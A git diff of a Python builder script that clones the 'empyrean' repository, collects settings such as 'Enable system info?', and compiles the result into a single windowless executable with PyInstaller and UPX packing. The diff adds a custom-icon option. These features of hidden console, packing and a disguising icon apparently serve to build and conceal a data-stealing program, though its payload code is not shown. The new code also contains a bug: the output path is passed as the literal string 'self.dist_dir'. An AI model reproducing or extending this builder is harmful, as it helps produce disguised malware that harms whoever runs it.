@@ -1,10 +1,11 @@
 import json
 import os
+import re
 import shutil
 import subprocess
-import re
+
 import requests
-from InquirerPy import prompt # type: ignore
+from InquirerPy import prompt  # type: ignore
 
 
 def get_config() -> dict:
@@ -51,9 +52,22 @@ def get_config() -> dict:
             "message": "Enable system info?",
             "default": True,
         },
+        {
+            "type": "confirm",
+            "name": "use_icon",
+            "message": "Use a custom icon for the executable?",
+            "default": False,
+        },
+        {
+            "when": lambda answers: answers["use_icon"],
+            "type": "input",
+            "name": "icon_path",
+            "message": "Enter the path of the icon file",
+        }
     ]
 
     return prompt(questions)
+
 
 class make_env:
     def __init__(self) -> None:
@@ -73,6 +87,7 @@ class make_env:
         subprocess.run(['git', 'clone', 'https://github.com/addi00000/empyrean.git'], cwd=self.build_dir)
         shutil.move(os.path.join(self.build_dir, 'empyrean', 'src'), self.build_dir)
 
+
 class write_config:
     def __init__(self, config: dict) -> None:
         self.config = config
@@ -83,8 +98,10 @@ class write_config:
         with open(self.config_file, 'w') as f:
             f.write(f'__CONFIG__ = {self.config}')
 
+
 class build:
-    def __init__(self) -> None:
+    def __init__(self, config: dict) -> None:
+        self.config = config
         self.build_dir = os.path.join(os.getcwd(), 'build')
         self.dist_dir = os.path.join(self.build_dir, '..', 'dist')
 
@@ -92,7 +109,13 @@ class build:
         self.get_pyinstaller()
         self.get_upx()
 
-        subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', self.dist_dir, '--workpath', os.path.join(self.build_dir, 'work'), '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), os.path.join(self.build_dir, 'src', 'main.py')])
+        if self.config["use_icon"]:
+            iconpath = self.config["icon_path"]
+            subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', 'self.dist_dir', '--workpath', os.path.join(self.build_dir, 'work'), '--specpath',
+                           os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), '--icon', iconpath, os.path.join(self.build_dir, 'src', 'main.py')])
+        else:
+            subprocess.run(['pyinstaller', '--onefile', '--noconsole', '--clean', '--distpath', 'self.dist_dir', '--workpath', os.path.join(self.build_dir, 'work'),
+                           '--specpath', os.path.join(self.build_dir, 'spec'), '--upx-dir', os.path.join(self.build_dir, 'upx'), os.path.join(self.build_dir, 'src', 'main.py')])
 
     def get_pyinstaller(self) -> None:
         url = 'https://github.com/pyinstaller/pyinstaller/archive/refs/tags/v5.1.zip'
@@ -109,7 +132,7 @@ class build:
         subprocess.run(['pip', 'uninstall', '-y', 'pyinstaller'], cwd=self.build_dir)
         subprocess.run(['py', '-3.10', './waf', 'all', '--target-arch=64bit'], cwd=os.path.join(self.build_dir, 'pyinstaller', 'bootloader'))
         subprocess.run(['py', '-3.10', 'setup.py', 'install'], cwd=os.path.join(self.build_dir, 'pyinstaller'))
-    
+
     def get_upx(self) -> None:
         url = 'https://github.com/upx/upx/releases/download/v3.96/upx-3.96-win64.zip'
 
@@ -122,11 +145,13 @@ class build:
         os.rename(os.path.join(self.build_dir, 'upx-3.96-win64'), os.path.join(self.build_dir, 'upx'))
         os.remove(os.path.join(self.build_dir, 'upx.zip'))
 
+
 def main() -> None:
     config = get_config()
     make_env()()
     write_config(config)()
-    build()()
+    build(config)()
+
 
 if __name__ == '__main__':
     main()
